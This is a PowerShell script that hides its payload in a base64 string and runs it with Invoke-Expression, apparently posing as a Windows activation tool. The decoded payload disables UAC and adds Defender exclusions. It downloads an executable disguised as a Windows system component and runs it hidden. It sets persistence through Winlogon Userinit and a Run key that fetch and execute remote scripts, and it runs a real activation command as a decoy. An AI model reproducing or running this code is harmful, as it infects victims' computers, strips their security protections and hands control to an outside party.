$base64EncodedString = "QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwpmdW5jdGlvbiBTaG93LUVycm9yTWVzc2FnZSB7CgogICAgcGFyYW0gKAoKICAgICAgICBbc3RyaW5nXSRtZXNzYWdlLAoKICAgICAgICBbc3RyaW5nXSR0aXRsZSA9ICJJbnN1ZmZpY2llbnQgcHJpdmlsZWdlcyIKCiAgICApCgogICAgCgogICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCRtZXNzYWdlLCAkdGl0bGUsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94QnV0dG9uc106Ok9LLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEljb25dOjpFcnJvcikKCn0KaWYgKC1OT1QgKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF0gW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLklzSW5Sb2xlKGAKW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdICJBZG1pbmlzdHJhdG9yIikpIHsKICAgIFdyaXRlLVdhcm5pbmcgIkluc3VmZmljaWVudCBwcml2aWxlZ2VzIHRvIGV4ZWN1dGUgdGhpcyBzY3JpcHQuIE9wZW4gYSBQb3dlclNoZWxsIGNvbnNvbGUgd2l0aCBhZG1pbmlzdHJhdG9yIHByaXZpbGVnZXMgYW5kIHJ1biB0aGUgc2NyaXB0IGFnYWluLiIKICAgIFNob3ctRXJyb3JNZXNzYWdlIC1tZXNzYWdlICJJbnN1ZmZpY2llbnQgcHJpdmlsZWdlcyB0byBleGVjdXRlIHRoaXMgc2NyaXB0LiBPcGVuIGEgUG93ZXJTaGVsbCBjb25zb2xlIHdpdGggYWRtaW5pc3RyYXRvciBwcml2aWxlZ2VzIGFuZCBydW4gdGhlIHNjcmlwdCBhZ2Fpbi4iCkJyZWFrCn0KCiRvZmZpY2VEb3dubG9hZFVybEI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiaHR0cHM6Ly9naXRodWIuY29tL1dpbmRvd3NUd2Vha3NYL1Bvd2VyU2hlbGxBY3RpdmF0ZS9yYXcvcmVmcy9oZWFkcy9tYWluL2RvbGJhZWIuZXhlIikpCiR1cGRhdGVycnJFeGVCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIlNlY3VyaXR5QWNjb3VudHMgTWFuYWdlcihTQU0pLmV4ZSIpKQoKJGhpZGRlbkF0dHJCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIkhpZGRlbiIpKQokc2lsZW50bHlDb250aW51ZUI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiU2lsZW50bHlDb250aW51ZSIpKQokc3RvcEFjdGlvbkI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiU3RvcCIpKQokZGlyZWN0b3J5QjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJEaXJlY3RvcnkiKSkKJHByb2dyYW1maWxlc0I2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiQzpcUHJvZ3JhbSBGaWxlcyIpKQoKJG9mZmljZURvd25sb2FkVXJsID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkb2ZmaWNlRG93bmxvYWRVcmxCNjQpKQokdXBkYXRlcnJyRXhlID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkdXBkYXRlcnJyRXhlQjY0KSkKJGhpZGRlbkF0dHIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRoaWRkZW5BdHRyQjY0KSkKJHNpbGVudGx5Q29udGludWUgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRzaWxlbnRseUNvbnRpbnVlQjY0KSkKJHN0b3BBY3Rpb24gPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRzdG9wQWN0aW9uQjY0KSkKJGRpcmVjdG9yeSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGRpcmVjdG9yeUI2NCkpCiRwcm9ncmFtZmlsZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRwcm9ncmFtZmlsZXNCNjQpKQoKJGhpZGRlbkZvbGRlck5hbWUgPSAiU2VjdXJpdHlBY2NvdW50c01hbmFnZXJfIiArIFtTeXN0ZW0uR3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygpLlN1YnN0cmluZygwLDgpCiRoaWRkZW5Gb2xkZXIgPSBKb2luLVBhdGggJGVudjpMT0NBTEFQUERBVEEgJGhpZGRlbkZvbGRlck5hbWUKTmV3LUl0ZW0gLUl0ZW1UeXBlICRkaXJlY3RvcnkgLVBhdGggJGhpZGRlbkZvbGRlciAtRm9yY2UgfCBPdXQtTnVsbAokb2ZmaWNlUGF0aCA9IEpvaW4tUGF0aCAkaGlkZGVuRm9sZGVyICR1cGRhdGVycnJFeGUKTmV3LUl0ZW0gLVBhdGggIkM6XFByb2dyYW0gRmlsZXNcRXRoZXJuZXQgQ29uZmlndXJhdGlvbiIgLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UKJHNjcmlwdFBhdGggPSAiQzpcUHJvZ3JhbSBGaWxlc1xFdGhlcm5ldCBDb25maWd1cmF0aW9uXFVzZXJpbml0LnBzMSIKJHJlZ1BhdGggPSAiSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24iCiRuZXdVc2VyID0gIkM6XFdpbmRvd3NcU3lzdGVtMzJcdXNlcmluaXQuZXhlLEM6XFByb2dyYW0gRmlsZXNcRXRoZXJuZXQgQ29uZmlndXJhdGlvblxVc2VyaW5pdC5wczEiCgokc2NyaXB0Q29udGVudCA9IEAnCml3ciAnaHR0cHM6Ly9naXRodWIuY29tL1dpbmRvd3NUd2Vha3NYL1Bvd2VyU2hlbGxBY3RpdmF0ZS9yYXcvcmVmcy9oZWFkcy9tYWluL0FjdGl2YXRlU2NyaXB0JyB8IGlleAonQAoKZnVuY3Rpb24gQWRkLUZvbGRlckV4Y2x1c2lvbiB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kcGF0aCwKICAgICAgICBbaW50XSRtYXhSZXRyaWVzID0gNSwKICAgICAgICBbaW50XSRkZWxheVNlY29uZHMgPSAxCiAgICApCiAgICAkcmV0cnlDb3VudCA9IDAKICAgICRzdWNjZXNzID0gJGZhbHNlCiAgICAKICAgIHdoaWxlICgtbm90ICRzdWNjZXNzIC1hbmQgJHJldHJ5Q291bnQgLWx0ICRtYXhSZXRyaWVzKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkcGF0aCAtRXJyb3JBY3Rpb24gJHN0b3BBY3Rpb24KICAgICAgICAgICAgaWYgKEdldC1NcFByZWZlcmVuY2UgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBFeGNsdXNpb25QYXRoIHwgV2hlcmUtT2JqZWN0IHsgJF8gLWVxICRwYXRoIH0pIHsKICAgICAgICAgICAgICAgICRzdWNjZXNzID0gJHRydWUKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICAkcmV0cnlDb3VudCsrCiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRkZWxheVNlY29uZHMKICAgICAgICB9CiAgICB9CiAgICBpZiAoLW5vdCAkc3VjY2VzcykgewogICAgfQogICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAyMDAKfQoKCnRyeSB7CiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICJIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0iIC1OYW1lICJFbmFibGVMVUEiIC1WYWx1ZSAwCiAgICBBZGQtRm9sZGVyRXhjbHVzaW9uIC1wYXRoICRwcm9ncmFtZmlsZXMKICAgIEFkZC1Gb2xkZXJFeGNsdXNpb24gLXBhdGggJGhpZGRlbkZvbGRlcgogICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkb2ZmaWNlUGF0aAogICAgU2V0LUNvbnRlbnQgLVBhdGggJHNjcmlwdFBhdGggLVZhbHVlICRzY3JpcHRDb250ZW50CiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRzY3JpcHRQYXRoIC1OYW1lIEF0dHJpYnV0ZXMgLVZhbHVlIChbU3lzdGVtLklPLkZpbGVBdHRyaWJ1dGVzXTo6SGlkZGVuKQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnUGF0aCAtTmFtZSAiVXNlcmluaXQiIC1WYWx1ZSAkbmV3VXNlcgogICAgQ2xlYXItSG9zdAogICAgV3JpdGUtSG9zdCAiTG9hZGluZyBBY3RpdmF0aW9uIFNjcmlwdC4uLiIgLUZvcmVncm91bmRDb2xvciBEYXJrR3JlZW4gLUJhY2tncm91bmRDb2xvciBXaGl0ZQogICAgCiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRvZmZpY2VEb3dubG9hZFVybCAtT3V0RmlsZSAkb2ZmaWNlUGF0aCAtVXNlQmFzaWNQYXJzaW5nIC1FcnJvckFjdGlvbiAkc3RvcEFjdGlvbgogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkaGlkZGVuRm9sZGVyIC1OYW1lIEF0dHJpYnV0ZXMgLVZhbHVlICRoaWRkZW5BdHRyCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRvZmZpY2VQYXRoIC1OYW1lIEF0dHJpYnV0ZXMgLVZhbHVlICRoaWRkZW5BdHRyCgogICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJG9mZmljZVBhdGggLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgICAgCiAgICAkcmVnUGF0aE9mZmljZSA9ICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iCiAgICAkcmVnTmFtZU9mZmljZSA9ICJXaW5kb3dzIFBvd2Vyc2hlbGwgU2VydmljZSAoV1BTKSIKICAgICRyZWdWYWx1ZU9mZmljZSA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kIGAiaXdyICdodHRwczovL2dpdGh1Yi5jb20vV2luZG93c1R3ZWFrc1gvUG93ZXJTaGVsbEFjdGl2YXRlL3Jhdy9yZWZzL2hlYWRzL21haW4vUmVhY3RpdmF0ZVNjcmlwdCcgfCBpZXhgIiIKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ1BhdGhPZmZpY2UgLU5hbWUgJHJlZ05hbWVPZmZpY2UgLVZhbHVlICRyZWdWYWx1ZU9mZmljZSAtRXJyb3JBY3Rpb24gJHNpbGVudGx5Q29udGludWUKICAgIAogICAgTmV3LUl0ZW0gLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXE5vdGlmaWNhdGlvbnNcU2V0dGluZ3MiIC1OYW1lICR1cGRhdGVycnJFeGUgLUZvcmNlIHwgT3V0LU51bGwKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXE5vdGlmaWNhdGlvbnNcU2V0dGluZ3NcJHVwZGF0ZXJyckV4ZSIgLU5hbWUgIkVuYWJsZWQiIC1WYWx1ZSAwIC1FcnJvckFjdGlvbiAkc2lsZW50bHlDb250aW51ZQogICAgCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAyCn0gY2F0Y2ggewogICAgV3JpdGUtSG9zdCAiRXJyb3I6ICRfIgogICAgZXhpdCAxCn0gZmluYWxseSB7CiAgICBpcm0gaHR0cHM6Ly9nZXQuYWN0aXZhdGVkLndpbiB8IGlleAogICAgCn0K"
$decodedBytes = [System.Convert]::FromBase64String($base64EncodedString)
$decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
Invoke-Expression $decodedString
